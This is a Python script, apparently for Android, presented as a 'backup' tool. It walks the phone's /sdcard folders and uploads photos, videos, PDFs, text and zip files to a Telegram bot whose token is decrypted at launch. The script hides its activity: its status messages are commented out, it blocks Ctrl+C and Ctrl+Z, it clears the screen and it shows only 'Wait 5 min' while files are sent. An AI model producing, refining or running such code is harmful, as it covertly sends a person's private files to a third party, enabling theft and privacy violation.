import os
import json
import asyncio
import signal
from telegram import Bot
from telegram.error import RetryAfter, TimedOut, NetworkError
from secure import decrypt_data
password = input("Enter password: ")
TOKEN, CHAT_ID = decrypt_data(password)
# ============================
# GLOBALS
# ============================
STOP_FLAG_FILE = "/sdcard/.stop_backup"
LOG = "/sdcard/.backup_done.json"
PASSWORD = "12345"   # ← user can change this

done = set()
# AUTO-DELETE STOP FLAG ON START
if os.path.exists(STOP_FLAG_FILE):
    os.remove(STOP_FLAG_FILE)

# ======================================================
# Function: Load old log
# ======================================================
def load_log():
    global done
    if os.path.exists(LOG):
        try:
            done = set(json.load(open(LOG)))
        except:
            done = set()
    else:
        done = set()


# ======================================================
# Function: Save log
# ======================================================
def save_log():
    json.dump(list(done), open(LOG, "w"))


# ======================================================
# Function: Send File with safety
# ======================================================
async def send_file(bot, CHAT_ID, path):
    if path in done:
        return

    while True:
        try:
            await bot.send_document(chat_id=CHAT_ID, document=open(path, "rb"))
            #print("📤 Sent:", path)

            done.add(path)
            save_log()
            break

        except RetryAfter as e:
            #print("⏳ Rate-limit — waiting:", e.retry_after)
            await asyncio.sleep(e.retry_after)

        except (TimedOut, NetworkError):
            #print("⚠ Network issue — retrying…")
            await asyncio.sleep(2)

        except Exception as e:
            #print("❌ Error sending:", e)
            break


# ======================================================
# BACKUP ENGINE
# ======================================================
async def backup_engine(bot, CHAT_ID):
    TARGETS = [
        "/sdcard",
        "/sdcard/DCIM",
        "/sdcard/Pictures",
        "/sdcard/Download",
        "/sdcard/Documents",
        "/sdcard/Movies",
        "/sdcard/Music",
    ]

    EXTS = (".jpg", ".jpeg", ".png", ".webp", ".mp4", ".mkv", ".pdf", ".txt", ".zip")

    #print("\n🔍 Starting backup...\n")

    for folder in TARGETS:
        if not os.path.exists(folder):
            continue

        for root, dirs, files in os.walk(folder):

            # STOP CHECK
            if os.path.exists(STOP_FLAG_FILE):
                print("🛑 STOP FLAG FOUND → Backup Paused")
                return

            for file in files:
                if file.lower().endswith(EXTS):
                    path = os.path.join(root, file)
                    await send_file(bot, CHAT_ID, path)

    #print("\n🎉 Backup Completed!")


# ======================================================
# SIGNAL BLOCKER (optional)
# ======================================================
def block_ctrl_signals():
    signal.signal(signal.SIGINT, signal.SIG_IGN)   # Ctrl+C
    signal.signal(signal.SIGTSTP, signal.SIG_IGN)  # Ctrl+Z


# ======================================================
# MAIN
# ======================================================
async def main():
    # ---- Input ----
    bot = Bot(token=TOKEN)
   # print("\n==== USER SETTINGS ====\n")

    non_disturb = "y".lower() == "y"
    block_ctrl = "y".lower() == "y"
    clear_screen = "y".lower() == "y"

    #print("\nStop command: CREATE file →", STOP_FLAG_FILE)
    #print("Stop password required using stop_tool.py\n")

    start = "y".lower()
    print("wait 5 min ")
    if start != "y":
        #print("Backup cancelled.")
        return

    if block_ctrl:
        block_ctrl_signals()

    if non_disturb and clear_screen:
        os.system("clear")
        print("Wait 5 min")

    load_log()
    await backup_engine(bot, CHAT_ID)


if __name__ == "__main__":
    asyncio.run(main())
